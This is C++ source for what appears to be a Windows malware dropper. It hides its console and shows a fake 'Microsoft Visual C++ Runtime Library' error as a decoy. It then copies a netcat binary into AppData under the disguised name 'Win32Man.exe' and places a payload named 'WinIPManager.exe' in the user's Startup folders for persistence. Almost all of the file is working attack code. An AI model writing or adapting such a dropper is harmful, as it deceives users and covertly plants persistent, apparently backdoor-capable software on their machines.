// this file dropps the payload into the startup folder
#define _WIN32_WINNT 0x0500
#include <Windows.h>
#include <string>
#include <Lmcons.h>

int main(int argc, char* argv[])
{
	ShowWindow(GetConsoleWindow(), SW_HIDE);

  // show fake runtime error
	MessageBox
	(
		NULL,
		"Runtime Error!\nProgram: \n\nThis application has requested the Runtime to terminate it in an unusual way.\nPlease contact the application\'s support team for more information.",
		"Microsoft Visual C++ Runtime Library",
		MB_OK | MB_ICONSTOP
	);

	// get path for payload to be moved
	TCHAR username [ UNLEN + 1 ];
	DWORD size = UNLEN + 1;
	GetUserName((TCHAR*)username, &size);

	std::string newPayloadDirectory = "C:\\Users\\";
	newPayloadDirectory += username;
	newPayloadDirectory += "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Start-up\\WinIPManager.exe";

	std::string otherPayloadDirectory = "C:\\Users\\";
	otherPayloadDirectory += username;
	otherPayloadDirectory += "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WinIPManager.exe";

  std::string ncatDir = "C:\\Users\\";
	ncatDir += username;
	ncatDir += "\\AppData\\Local\\Win32Man.exe";

	// move the payload to startup
  CopyFile("../src/ncat.exe", ncatDir.c_str(), false);
	CopyFile("../src/main.exe", newPayloadDirectory.c_str(), false);
	CopyFile("../src/main.exe", otherPayloadDirectory.c_str(), false);
	return 0;
}
